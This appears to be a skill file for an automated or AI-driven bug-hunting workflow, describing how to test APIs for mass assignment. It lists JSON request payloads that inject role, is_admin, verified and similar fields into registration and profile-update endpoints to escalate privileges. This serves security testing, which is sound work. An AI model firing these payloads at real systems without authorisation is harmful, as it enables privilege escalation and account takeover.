---
name: hunt-mass-assignment
description: Mass assignment and parameter pollution — inject undeclared fields (role, admin, verified) into API requests to escalate privileges or bypass controls.
triggers:
  - mass assignment
  - parameter pollution
  - overposting
  - role escalation
  - auto-bind
priority: 80
---

# hunt-mass-assignment — Mass Assignment Testing

## Method

### 1. Schema Diffing
- GET the resource to see what fields exist in the response
- Compare response fields with what the API docs say are writable
- Any read-only field in the response is a mass assignment candidate

### 2. Role/Permission Injection
```json
// Registration
POST /api/users
{"email": "test@test.com", "password": "test", "role": "admin"}
{"email": "test@test.com", "password": "test", "is_admin": true}
{"email": "test@test.com", "password": "test", "permissions": ["admin"]}

// Profile update
PATCH /api/users/me
{"name": "Test", "role": "admin", "verified": true, "is_staff": true}
```

### 3. Systematic Field Injection
For each POST/PUT/PATCH endpoint:
1. GET the resource first — note ALL response fields
2. Add each response field to the write request
3. Check if the field was actually updated
4. Focus on: role, admin, verified, active, banned, balance, plan, tier

### 4. Nested Object Injection
```json
{"user": {"name": "test", "role": {"name": "admin"}}}
{"profile": {"settings": {"is_admin": true}}}
```

## Validation
- Show that a write-only field was actually persisted
- Demonstrate privilege escalation (user became admin) or control bypass
- GET the resource after the PATCH to confirm the field changed
